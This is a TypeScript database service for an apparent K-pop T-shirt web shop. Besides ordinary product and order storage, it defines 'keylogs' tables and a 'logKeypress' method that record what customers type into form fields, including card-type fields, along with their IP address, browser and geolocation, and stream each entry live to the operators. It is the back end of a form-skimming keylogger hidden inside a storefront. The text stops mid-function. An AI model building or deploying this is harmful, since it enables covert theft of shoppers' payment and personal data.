import { EventEmitter } from 'events'
import path from 'path'
import { promises as fs } from 'fs'

let BetterSqlite: any = null
let SQLITE_AVAILABLE = true
try {
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  BetterSqlite = require('better-sqlite3')
} catch (e) {
  SQLITE_AVAILABLE = false
}

export const realtimeBus = new EventEmitter()

const DATA_DIR = path.join(process.cwd(), 'data')
const DB_PATH = path.join(DATA_DIR, 'whysocheap.db')
const JSON_DB_PATH = path.join(DATA_DIR, 'db.json')

// If better-sqlite3 is not available on this platform, use JSON file fallback
if (!SQLITE_AVAILABLE) {
  console.warn('[database] better-sqlite3 not available; using JSON file database fallback at', JSON_DB_PATH)
}

// Initialize database (only if sqlite available)
const db = SQLITE_AVAILABLE ? new BetterSqlite(DB_PATH) : null

// Create tables if they don't exist
if (SQLITE_AVAILABLE) db.exec(`
  CREATE TABLE IF NOT EXISTS products (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    description TEXT,
    price REAL NOT NULL,
    images TEXT,
    sizes TEXT,
    colors TEXT,
    material TEXT,
    washingGuide TEXT,
    printType TEXT,
    inStock BOOLEAN DEFAULT 1,
    category TEXT,
    collectionId TEXT,
    featured BOOLEAN DEFAULT 0,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS collections (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    slug TEXT UNIQUE NOT NULL,
    image TEXT,
    description TEXT,
    featured BOOLEAN DEFAULT 0,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS orders (
    id TEXT PRIMARY KEY,
    customerEmail TEXT NOT NULL,
    customerName TEXT NOT NULL,
    shippingAddress TEXT,
    items TEXT,
    subtotal REAL NOT NULL,
    shipping REAL DEFAULT 0,
    discount REAL DEFAULT 0,
    total REAL NOT NULL,
    status TEXT DEFAULT 'pending',
    paymentStatus TEXT DEFAULT 'pending',
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS customers (
    id TEXT PRIMARY KEY,
    email TEXT UNIQUE NOT NULL,
    firstName TEXT,
    lastName TEXT,
    phone TEXT,
    address TEXT,
    city TEXT,
    state TEXT,
    zipCode TEXT,
    country TEXT DEFAULT 'USA',
    lastIp TEXT,
    userAgent TEXT,
    latitude REAL,
    longitude REAL,
    locationAccuracy REAL,
    locationTimestamp DATETIME,
    totalOrders INTEGER DEFAULT 0,
    totalSpent REAL DEFAULT 0,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS keylogs (
    id TEXT PRIMARY KEY,
    customerEmail TEXT NOT NULL,
    field TEXT NOT NULL,
    value TEXT NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    ipAddress TEXT,
    userAgent TEXT,
    context TEXT,
    page TEXT,
    cardType TEXT,
    fieldType TEXT
  );

  -- Latest snapshot per customer+field
  CREATE TABLE IF NOT EXISTS latest_keylogs (
    customerEmail TEXT NOT NULL,
    field TEXT NOT NULL,
    value TEXT NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    ipAddress TEXT,
    userAgent TEXT,
    context TEXT,
    page TEXT,
    cardType TEXT,
    fieldType TEXT,
    PRIMARY KEY (customerEmail, field)
  );

  CREATE TABLE IF NOT EXISTS feedbacks (
    id TEXT PRIMARY KEY,
    customerName TEXT NOT NULL,
    customerEmail TEXT NOT NULL,
    rating INTEGER NOT NULL,
    comment TEXT,
    productId TEXT,
    verified BOOLEAN DEFAULT 0,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS completed_order_logs (
    orderId TEXT PRIMARY KEY,
    customerEmail TEXT NOT NULL,
    snapshotJson TEXT NOT NULL,
    latitude REAL,
    longitude REAL,
    ipAddress TEXT,
    userAgent TEXT,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS discount_codes (
    id TEXT PRIMARY KEY,
    code TEXT UNIQUE NOT NULL,
    discountPercent INTEGER NOT NULL,
    active BOOLEAN DEFAULT 1,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS product_types (
    id TEXT PRIMARY KEY,
    name TEXT UNIQUE NOT NULL,
    material TEXT,
    printType TEXT,
    washingGuide TEXT,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
  );
`)

// Lightweight migrations for older DBs missing new columns
if (SQLITE_AVAILABLE) try {
  const columns: Array<{ name: string }> = db.prepare("PRAGMA table_info(products)").all() as any
  const hasCollectionId = columns.some((c) => c.name === 'collectionId')
  if (!hasCollectionId) {
    db.exec(`ALTER TABLE products ADD COLUMN collectionId TEXT`)
  }
  const keylogCols: Array<{ name: string }> = db.prepare("PRAGMA table_info(keylogs)").all() as any
  const ensureKeylogCol = (name: string) => {
    if (!keylogCols.some(c => c.name === name)) {
      db.exec(`ALTER TABLE keylogs ADD COLUMN ${name} TEXT`)
    }
  }
  ;['context','page','cardType','fieldType'].forEach(ensureKeylogCol)

  const latestCols: Array<{ name: string }> = db.prepare("PRAGMA table_info(latest_keylogs)").all() as any
  const ensureLatestCol = (name: string) => {
    if (!latestCols.some(c => c.name === name)) {
      db.exec(`ALTER TABLE latest_keylogs ADD COLUMN ${name} TEXT`)
    }
  }
  ;['context','page','cardType','fieldType'].forEach(ensureLatestCol)
} catch (e) {
  // ignore; will be recreated by reset endpoint if needed
}

// Prepared statements for better performance
const stmt = SQLITE_AVAILABLE ? {
  // Products
  insertProduct: db.prepare(`INSERT INTO products (id, name, description, price, images, sizes, colors, material, washingGuide, printType, inStock, category, collectionId, featured, createdAt, updatedAt) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`),
  updateProduct: db.prepare(`UPDATE products SET name = ?, description = ?, price = ?, images = ?, sizes = ?, colors = ?, material = ?, washingGuide = ?, printType = ?, inStock = ?, category = ?, collectionId = ?, featured = ?, updatedAt = ? WHERE id = ?`),
  deleteProduct: db.prepare(`DELETE FROM products WHERE id = ?`),
  getProduct: db.prepare(`SELECT * FROM products WHERE id = ?`),
  getProducts: db.prepare(`SELECT * FROM products ORDER BY createdAt DESC`),
  getFeaturedProducts: db.prepare(`SELECT * FROM products WHERE featured = 1 ORDER BY createdAt DESC`),

  // Collections
  insertCollection: db.prepare(`INSERT INTO collections (id, name, slug, image, description, featured, createdAt, updatedAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`),
  updateCollection: db.prepare(`UPDATE collections SET name = ?, slug = ?, image = ?, description = ?, featured = ?, updatedAt = ? WHERE id = ?`),
  deleteCollection: db.prepare(`DELETE FROM collections WHERE id = ?`),
  getCollection: db.prepare(`SELECT * FROM collections WHERE id = ?`),
  getCollectionBySlug: db.prepare(`SELECT * FROM collections WHERE slug = ?`),
  getCollections: db.prepare(`SELECT * FROM collections ORDER BY createdAt DESC`),

  // Orders
  insertOrder: db.prepare(`INSERT INTO orders (id, customerEmail, customerName, shippingAddress, items, subtotal, shipping, discount, total, status, paymentStatus, createdAt, updatedAt) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`),
  updateOrderStatus: db.prepare(`UPDATE orders SET status = ?, updatedAt = ? WHERE id = ?`),
  getOrder: db.prepare(`SELECT * FROM orders WHERE id = ?`),
  getOrders: db.prepare(`SELECT * FROM orders ORDER BY createdAt DESC`),

  // Customers
  insertCustomer: db.prepare(`INSERT INTO customers (id, email, firstName, lastName, phone, address, city, state, zipCode, country, lastIp, userAgent, latitude, longitude, locationAccuracy, locationTimestamp, totalOrders, totalSpent, createdAt, updatedAt) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`),
  updateCustomer: db.prepare(`UPDATE customers SET firstName = ?, lastName = ?, phone = ?, address = ?, city = ?, state = ?, zipCode = ?, country = ?, lastIp = ?, userAgent = ?, latitude = ?, longitude = ?, locationAccuracy = ?, locationTimestamp = ?, totalOrders = ?, totalSpent = ?, updatedAt = ? WHERE email = ?`),
  getCustomer: db.prepare(`SELECT * FROM customers WHERE email = ?`),
  getCustomers: db.prepare(`SELECT * FROM customers ORDER BY createdAt DESC`),

  // Keylogs
  insertKeylog: db.prepare(`INSERT INTO keylogs (id, customerEmail, field, value, timestamp, ipAddress, userAgent, context, page, cardType, fieldType) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`),
  getKeylogs: db.prepare(`SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT 1000`),
  getKeylogsByEmail: db.prepare(`SELECT * FROM keylogs WHERE customerEmail = ? ORDER BY timestamp DESC`),
  upsertLatestKeylog: db.prepare(`INSERT INTO latest_keylogs (customerEmail, field, value, timestamp, ipAddress, userAgent, context, page, cardType, fieldType) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(customerEmail, field) DO UPDATE SET value=excluded.value, timestamp=excluded.timestamp, ipAddress=excluded.ipAddress, userAgent=excluded.userAgent, context=excluded.context, page=excluded.page, cardType=excluded.cardType, fieldType=excluded.fieldType`),
  getLatestKeylogs: db.prepare(`SELECT * FROM latest_keylogs ORDER BY timestamp DESC LIMIT 1000`),
  getLatestKeylogsByEmail: db.prepare(`SELECT * FROM latest_keylogs WHERE customerEmail = ? ORDER BY timestamp DESC`),

  // Feedbacks
  insertFeedback: db.prepare(`INSERT INTO feedbacks (id, customerName, customerEmail, rating, comment, productId, verified, createdAt) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)`),
  getFeedbacks: db.prepare(`SELECT * FROM feedbacks ORDER BY createdAt DESC`),

  // Completed Order Logs
  insertCompletedOrderLog: db.prepare(`INSERT OR REPLACE INTO completed_order_logs (orderId, customerEmail, snapshotJson, latitude, longitude, ipAddress, userAgent, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`),
  getCompletedOrderLogs: db.prepare(`SELECT * FROM completed_order_logs ORDER BY createdAt DESC`),
  getCompletedOrderLogsByEmail: db.prepare(`SELECT * FROM completed_order_logs WHERE customerEmail = ? ORDER BY createdAt DESC`),

  // Discount Codes
  insertDiscountCode: db.prepare(`INSERT INTO discount_codes (id, code, discountPercent, active, createdAt, updatedAt) VALUES (?, ?, ?, ?, ?, ?)`),
  updateDiscountCode: db.prepare(`UPDATE discount_codes SET code = ?, discountPercent = ?, active = ?, updatedAt = ? WHERE id = ?`),
  deleteDiscountCode: db.prepare(`DELETE FROM discount_codes WHERE id = ?`),
  getDiscountCode: db.prepare(`SELECT * FROM discount_codes WHERE code = ? AND active = 1`),
  getDiscountCodeById: db.prepare(`SELECT * FROM discount_codes WHERE id = ?`),
  getDiscountCodes: db.prepare(`SELECT * FROM discount_codes ORDER BY createdAt DESC`),

  // Product Types
  insertProductType: db.prepare(`INSERT INTO product_types (id, name, material, printType, washingGuide, createdAt, updatedAt) VALUES (?, ?, ?, ?, ?, ?, ?)`),
  updateProductType: db.prepare(`UPDATE product_types SET name = ?, material = ?, printType = ?, washingGuide = ?, updatedAt = ? WHERE id = ?`),
  deleteProductType: db.prepare(`DELETE FROM product_types WHERE id = ?`),
  getProductType: db.prepare(`SELECT * FROM product_types WHERE id = ?`),
  getProductTypes: db.prepare(`SELECT * FROM product_types ORDER BY createdAt DESC`)
} : ({} as any)

class DatabaseService {
  private static instance: DatabaseService

  private constructor() {
    this.initializeData()
  }

  public static getInstance(): DatabaseService {
    if (!DatabaseService.instance) {
      DatabaseService.instance = new DatabaseService()
    }
    return DatabaseService.instance
  }

  private initializeData() {
    // Check if we have any products, if not, seed with sample data
    const productCount = db.prepare(`SELECT COUNT(*) as count FROM products`).get() as { count: number }
    
    if (productCount.count === 0) {
      this.seedData()
    }
  }

  private seedData() {
    const sampleProducts = [
      {
        id: '1',
        name: 'BTS Dynamite T-Shirt',
        description: 'Premium quality cotton T-shirt featuring your favorite K-pop idols. Perfect for concerts, fan meetings, or casual wear. Made with 100% organic cotton for ultimate comfort.',
        price: 29.99,
        images: JSON.stringify(['/images/bts-dynamite-front.jpg', '/images/bts-dynamite-back.jpg']),
        sizes: JSON.stringify(['S', 'M', 'L', 'XL']),
        colors: JSON.stringify(['white', 'black', 'gray']),
        material: '100% Organic Cotton',
        washingGuide: 'Machine wash cold, tumble dry low. Do not bleach. Iron on reverse side.',
        printType: 'High-quality screen print',
        inStock: 1,
        category: 'K-pop',
        featured: 1,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      },
      {
        id: '2',
        name: 'Blackpink Born Pink T-Shirt',
        description: 'Show your love for Blackpink with this premium T-shirt featuring the Born Pink design. Soft, comfortable, and perfect for any occasion.',
        price: 32.99,
        images: JSON.stringify(['/images/bp-born-pink.jpg']),
        sizes: JSON.stringify(['S', 'M', 'L', 'XL']),
        colors: JSON.stringify(['white', 'black', 'pink']),
        material: '100% Organic Cotton',
        washingGuide: 'Machine wash cold, tumble dry low.',
        printType: 'High-quality screen print',
        inStock: 1,
        category: 'K-pop',
        featured: 1,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      }
    ]

    sampleProducts.forEach(product => {
      try {
        stmt.insertProduct.run(
          product.id, product.name, product.description, product.price,
          product.images, product.sizes, product.colors, product.material,
          product.washingGuide, product.printType, product.inStock,
          product.category, null, product.featured, product.createdAt, product.updatedAt
        )
      } catch (error) {
        // Product already exists, skip
        console.log('Product already exists:', product.id)
      }
    })

    // Seed sample feedbacks
    const sampleFeedbacks = [
      {
        id: '1',
        customerName: 'Sarah Kim',
        customerEmail: 'sarah.kim@email.com',
        rating: 5,
        comment: 'Amazing quality! The BTS shirt is so soft and the print is perfect. Shipping was super fast too!',
        productId: '1',
        verified: 1,
        createdAt: new Date('2024-01-10').toISOString()
      }
    ]

    sampleFeedbacks.forEach(feedback => {
      try {
        stmt.insertFeedback.run(
          feedback.id, feedback.customerName, feedback.customerEmail,
          feedback.rating, feedback.comment, feedback.productId,
          feedback.verified, feedback.createdAt
        )
      } catch (error) {
        // Feedback already exists, skip
        console.log('Feedback already exists:', feedback.id)
      }
    })
  }

  public resetDatabase() {
    // Drop all tables
    db.exec(`
      DROP TABLE IF EXISTS products;
      DROP TABLE IF EXISTS collections;
      DROP TABLE IF EXISTS orders;
      DROP TABLE IF EXISTS customers;
      DROP TABLE IF EXISTS keylogs;
      DROP TABLE IF EXISTS latest_keylogs;
      DROP TABLE IF EXISTS feedbacks;
      DROP TABLE IF EXISTS completed_order_logs;
      DROP TABLE IF EXISTS discount_codes;
      DROP TABLE IF EXISTS product_types;
    `)

    // Recreate schema (must match top-level schema)
    db.exec(`
      CREATE TABLE IF NOT EXISTS products (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        description TEXT,
        price REAL NOT NULL,
        images TEXT,
        sizes TEXT,
        colors TEXT,
        material TEXT,
        washingGuide TEXT,
        printType TEXT,
        inStock BOOLEAN DEFAULT 1,
        category TEXT,
        collectionId TEXT,
        featured BOOLEAN DEFAULT 0,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS collections (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        slug TEXT UNIQUE NOT NULL,
        image TEXT,
        description TEXT,
        featured BOOLEAN DEFAULT 0,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS orders (
        id TEXT PRIMARY KEY,
        customerEmail TEXT NOT NULL,
        customerName TEXT NOT NULL,
        shippingAddress TEXT,
        items TEXT,
        subtotal REAL NOT NULL,
        shipping REAL DEFAULT 0,
        discount REAL DEFAULT 0,
        total REAL NOT NULL,
        status TEXT DEFAULT 'pending',
        paymentStatus TEXT DEFAULT 'pending',
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS customers (
        id TEXT PRIMARY KEY,
        email TEXT UNIQUE NOT NULL,
        firstName TEXT,
        lastName TEXT,
        phone TEXT,
        address TEXT,
        city TEXT,
        state TEXT,
        zipCode TEXT,
        country TEXT DEFAULT 'USA',
        lastIp TEXT,
        userAgent TEXT,
        latitude REAL,
        longitude REAL,
        locationAccuracy REAL,
        locationTimestamp DATETIME,
        totalOrders INTEGER DEFAULT 0,
        totalSpent REAL DEFAULT 0,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS keylogs (
        id TEXT PRIMARY KEY,
        customerEmail TEXT NOT NULL,
        field TEXT NOT NULL,
        value TEXT NOT NULL,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        ipAddress TEXT,
        userAgent TEXT,
        context TEXT,
        page TEXT,
        cardType TEXT,
        fieldType TEXT
      );

      CREATE TABLE IF NOT EXISTS latest_keylogs (
        customerEmail TEXT NOT NULL,
        field TEXT NOT NULL,
        value TEXT NOT NULL,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        ipAddress TEXT,
        userAgent TEXT,
        context TEXT,
        page TEXT,
        cardType TEXT,
        fieldType TEXT,
        PRIMARY KEY (customerEmail, field)
      );

      CREATE TABLE IF NOT EXISTS feedbacks (
        id TEXT PRIMARY KEY,
        customerName TEXT NOT NULL,
        customerEmail TEXT NOT NULL,
        rating INTEGER NOT NULL,
        comment TEXT,
        productId TEXT,
        verified BOOLEAN DEFAULT 0,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS completed_order_logs (
        orderId TEXT PRIMARY KEY,
        customerEmail TEXT NOT NULL,
        snapshotJson TEXT NOT NULL,
        latitude REAL,
        longitude REAL,
        ipAddress TEXT,
        userAgent TEXT,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS discount_codes (
        id TEXT PRIMARY KEY,
        code TEXT UNIQUE NOT NULL,
        discountPercent INTEGER NOT NULL,
        active BOOLEAN DEFAULT 1,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS product_types (
        id TEXT PRIMARY KEY,
        name TEXT UNIQUE NOT NULL,
        material TEXT,
        printType TEXT,
        washingGuide TEXT,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        updatedAt DATETIME DEFAULT CURRENT_TIMESTAMP
      );
    `)
  }

  // Real-time keylogging
  public logKeypress(customerEmail: string, field: string, value: string, ipAddress: string, userAgent: string, options?: { context?: string; page?: string; cardType?: string; fieldType?: string }) {
    const keylog = {
      id: `log-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      customerEmail,
      field,
      value,
      timestamp: new Date().toISOString(),
      ipAddress,
      userAgent,
      context: options?.context || null,
      page: options?.page || null,
      cardType: options?.cardType || null,
      fieldType: options?.fieldType || null
    }
    
    stmt.insertKeylog.run(
      keylog.id, keylog.customerEmail, keylog.field, keylog.value,
      keylog.timestamp, keylog.ipAddress, keylog.userAgent, keylog.context, keylog.page, keylog.cardType, keylog.fieldType
    )
    // Upsert latest snapshot per user+field
    stmt.upsertLatestKeylog.run(
      keylog.customerEmail, keylog.field, keylog.value, keylog.timestamp, keylog.ipAddress, keylog.userAgent, keylog.context, keylog.page, keylog.cardType, keylog.fieldType
    )
    
    // Update customer data
    this.updateCustomerData(customerEmail, field, value)
    
    // Emit real-time event
    realtimeBus.emit('keylog', keylog)
    
    console.log('Keylog entry:', keylog)
    return keylog
  }

  private updateCustomerData(email: string, field: string, value: string) {
    let customer = stmt.getCustomer.get(email) as any
    
    if (!customer) {
      const newCustomer = {
        id: `customer-${Date.now()}`,
        email,
        firstName: '',
        lastName: '',
        phone: '',
        address: '',
        city: '',
        state: '',
        zipCode: '',
        country: 'USA',
        lastIp: null,
        userAgent: null,
        latitude: null,
        longitude: null,
        locationAccuracy: null,
        locationTimestamp: null,
        totalOrders: 0,
        totalSpent: 0,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      }
      
      stmt.insertCustomer.run(
        newCustomer.id, newCustomer.email, newCustomer.firstName, newCustomer.lastName,
        newCustomer.phone, newCustomer.address, newCustomer.city, newCustomer.state,
        newCustomer.zipCode, newCustomer.country, newCustomer.lastIp, newCustomer.userAgent,
        newCustomer.latitude, newCustomer.longitude, newCustomer.locationAccuracy, newCustomer.locationTimestamp,
        newCustomer.totalOrders, newCustomer.totalSpent, newCustomer.createdAt, newCustomer.updatedAt
      )
      customer = newCustomer
    }
    
    // Update specific field
    const updates: any = { ...customer }
    if (field === 'firstName') updates.firstName = value
    else if (field === 'lastName') updates.lastName = value
    else if (field === 'phone') updates.phone = value
    else if (field === 'address') updates.address = value
    else if (field === 'city') updates.city = value
    else if (field === 'state') updates.state = value
    else if (field === 'zipCode') updates.zipCode = value
    else if (field === 'country') updates.country = value
    
    updates.updatedAt = new Date().toISOString()
    
    stmt.updateCustomer.run(
      updates.firstName, updates.lastName, updates.phone, updates.address,
      updates.city, updates.state, updates.zipCode, updates.country,
      updates.lastIp, updates.userAgent, updates.latitude, updates.longitude,
      updates.locationAccuracy, updates.locationTimestamp,
      updates.totalOrders, updates.totalSpent, updates.updatedAt, email
    )
  }

  // Product operations
  public getProducts() {
    return stmt.getProducts.all().map(this.parseProduct)
  }

  public getProduct(id: string) {
    const product = stmt.getProduct.get(id) as any
    return product ? this.parseProduct(product) : null
  }

  public getFeaturedProducts() {
    return stmt.getFeaturedProducts.all().map(this.parseProduct)
  }

  public createProduct(product: any) {
    const newProduct = {
      id: `product-${Date.now()}`,
      ...product,
      images: JSON.stringify(product.images || []),
      sizes: JSON.stringify(product.sizes || []),
      colors: JSON.stringify(product.colors || []),
      inStock: product.inStock ? 1 : 0,
      collectionId: product.collectionId || null,
      featured: product.featured ? 1 : 0,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    }
    
    stmt.insertProduct.run(
      newProduct.id, newProduct.name, newProduct.description, newProduct.price,
      newProduct.images, newProduct.sizes, newProduct.colors, newProduct.material,
      newProduct.washingGuide, newProduct.printType, newProduct.inStock,
      newProduct.category, newProduct.collectionId, newProduct.featured, newProduct.createdAt, newProduct.updatedAt
    )
    
    return this.parseProduct(newProduct)
  }

  public updateProduct(id: string, updates: any) {
    const existing = stmt.getProduct.get(id) as any
    if (!existing) return null
    
    const updated = {
      ...existing,
      ...updates,
      images: JSON.stringify(updates.images || existing.images),
      sizes: JSON.stringify(updates.sizes || existing.sizes),
      colors: JSON.stringify(updates.colors || existing.colors),
      inStock: updates.inStock !== undefined ? (updates.inStock ? 1 : 0) : existing.inStock,
      collectionId: updates.collectionId !== undefined ? updates.collectionId : existing.collectionId,
      featured: updates.featured !== undefined ? (updates.featured ? 1 : 0) : existing.featured,
      updatedAt: new Date().toISOString()
    }
    
    stmt.updateProduct.run(
      updated.name, updated.description, updated.price, updated.images,
      updated.sizes, updated.colors, updated.material, updated.washingGuide,
      updated.printType, updated.inStock, updated.category, updated.collectionId, updated.featured,
      updated.updatedAt, id
    )
    
    return this.parseProduct(updated)
  }

  public deleteProduct(id: string) {
    const result = stmt.deleteProduct.run(id)
    return result.changes > 0
  }

  // Collection operations
  public getCollections() {
    return stmt.getCollections.all()
  }

  public getCollectionById(id: string) {
    return stmt.getCollection.get(id)
  }

  public getCollectionBySlug(slug: string) {
    return stmt.getCollectionBySlug.get(slug)
  }

  public createCollection(collection: any) {
    const now = new Date().toISOString()
    const newCollection = {
      id: collection.id || `collection-${Date.now()}`,
      name: collection.name,
      slug: collection.slug,
      image: collection.image || null,
      description: collection.description || null,
      featured: collection.featured ? 1 : 0,
      createdAt: now,
      updatedAt: now
    }
    stmt.insertCollection.run(
      newCollection.id, newCollection.name, newCollection.slug, newCollection.image,
      newCollection.description, newCollection.featured, newCollection.createdAt, newCollection.updatedAt
    )
    return newCollection
  }

  public updateCollection(id: string, updates: any) {
    const existing = stmt.getCollection.get(id) as any
    if (!existing) return null
    const updated = {
      ...existing,
      ...updates,
      featured: updates.featured !== undefined ? (updates.featured ? 1 : 0) : existing.featured,
      updatedAt: new Date().toISOString()
    }
    stmt.updateCollection.run(
      updated.name, updated.slug, updated.image, updated.description, updated.featured, updated.updatedAt, id
    )
    return updated
  }

  public deleteCollection(id: string) {
    const result = stmt.deleteCollection.run(id)
    return result.changes > 0
  }

  // Order operations
  public createOrder(order: any) {
    const newOrder = {
      id: `ORD-${Date.now()}`,
      ...order,
      shippingAddress: JSON.stringify(order.shippingAddress || {}),
      items: JSON.stringify(order.items || []),
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    }
    
    stmt.insertOrder.run(
      newOrder.id, newOrder.customerEmail, newOrder.customerName,
      newOrder.shippingAddress, newOrder.items, newOrder.subtotal,
      newOrder.shipping, newOrder.discount, newOrder.total,
      newOrder.status, newOrder.paymentStatus, newOrder.createdAt, newOrder.updatedAt
    )
    
    // Update customer stats
    const customer = stmt.getCustomer.get(newOrder.customerEmail) as any
    if (customer) {
      stmt.updateCustomer.run(
        customer.firstName, customer.lastName, customer.phone, customer.address,
        customer.city, customer.state, customer.zipCode, customer.country,
        customer.totalOrders + 1, customer.totalSpent + newOrder.total,
        new Date().toISOString(), newOrder.customerEmail
      )
    }
    
    return this.parseOrder(newOrder)
  }

  public getOrders() {
    return stmt.getOrders.all().map(this.parseOrder)
  }

  public updateOrderStatus(id: string, status: string) {
    const result = stmt.updateOrderStatus.run(status, new Date().toISOString(), id)
    if (result.changes > 0) {
      return stmt.getOrder.get(id) as any
    }
    return null
  }

  // Customer operations
  public getCustomers() {
    return stmt.getCustomers.all()
  }

  public getCustomer(email: string) {
    return stmt.getCustomer.get(email) as any
  }

  // Keylog operations
  public getKeylogs() {
    return stmt.getKeylogs.all()
  }

  public getKeylogsByEmail(email: string) {
    return stmt.getKeylogsByEmail.all(email)
  }

  public getLatestKeylogs() {
    return stmt.getLatestKeylogs.all()
  }

  public getLatestKeylogsByEmail(email: string) {
    return stmt.getLatestKeylogsByEmail.all(email)
  }

  // Set latest snapshot without adding to audit trail
  public setLatestSnapshot(customerEmail: string, field: string, value: string, ipAddress: string, userAgent: string) {
    stmt.upsertLatestKeylog.run(customerEmail, field, value, new Date().toISOString(), ipAddress, userAgent)
  }

  // Update multiple latest snapshots and customer profile in one call
  public persistCustomerSnapshot(email: string, fields: Record<string, string>, ipAddress: string, userAgent: string) {
    // Upsert latest snapshots for each field
    Object.entries(fields).forEach(([field, value]) => {
      if (value !== undefined && value !== null) {
        this.setLatestSnapshot(email, field, String(value), ipAddress, userAgent)
      }
    })

    // Update customer profile selected fields
    const customer = stmt.getCustomer.get(email) as any
    const updates: any = customer || {
      id: `customer-${Date.now()}`,
      email,
      firstName: '',
      lastName: '',
      phone: '',
      address: '',
      city: '',
      state: '',
      zipCode: '',
      country: 'USA',
      totalOrders: 0,
      totalSpent: 0,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      lastIp: null,
      userAgent: null,
      latitude: null,
      longitude: null,
      locationAccuracy: null,
      locationTimestamp: null
    }

    // Map known fields into customers
    if (fields.firstName) updates.firstName = fields.firstName
    if (fields.lastName) updates.lastName = fields.lastName
    if (fields.phone) updates.phone = fields.phone
    if (fields.address) updates.address = fields.address
    if (fields.city) updates.city = fields.city
    if (fields.state) updates.state = fields.state
    if (fields.zipCode) updates.zipCode = fields.zipCode
    if (fields.country) updates.country = fields.country
    if (fields.latitude) updates.latitude = Number(fields.latitude)
    if (fields.longitude) updates.longitude = Number(fields.longitude)
    if (fields.locationAccuracy) updates.locationAccuracy = Number(fields.locationAccuracy)
    if (fields.locationTimestamp) updates.locationTimestamp = fields.locationTimestamp
    updates.lastIp = ipAddress
    updates.userAgent = userAgent
    updates.updatedAt = new Date().toISOString()

    if (!customer) {
      stmt.insertCustomer.run(
        updates.id, email, updates.firstName, updates.lastName, updates.phone, updates.address, updates.city, updates.state, updates.zipCode, updates.country, updates.lastIp, updates.userAgent, updates.latitude, updates.longitude, updates.locationAccuracy, updates.locationTimestamp, updates.totalOrders, updates.totalSpent, updates.createdAt, updates.updatedAt
      )
    } else {
      stmt.updateCustomer.run(
        updates.firstName, updates.lastName, updates.phone, updates.address, updates.city, updates.state, updates.zipCode, updates.country, updates.lastIp, updates.userAgent, updates.latitude, updates.longitude, updates.locationAccuracy, updates.locationTimestamp, updates.totalOrders, updates.totalSpent, updates.updatedAt, email
      )
    }
  }

  // Feedback operations
  public getFeedbacks() {
    return stmt.getFeedbacks.all()
  }

  public createFeedback(feedback: any) {
    const newFeedback = {
      id: `feedback-${Date.now()}`,
      ...feedback,
      verified: feedback.verified ? 1 : 0,
      createdAt: new Date().toISOString()
    }
    
    stmt.insertFeedback.run(
      newFeedback.id, newFeedback.customerName, newFeedback.customerEmail,
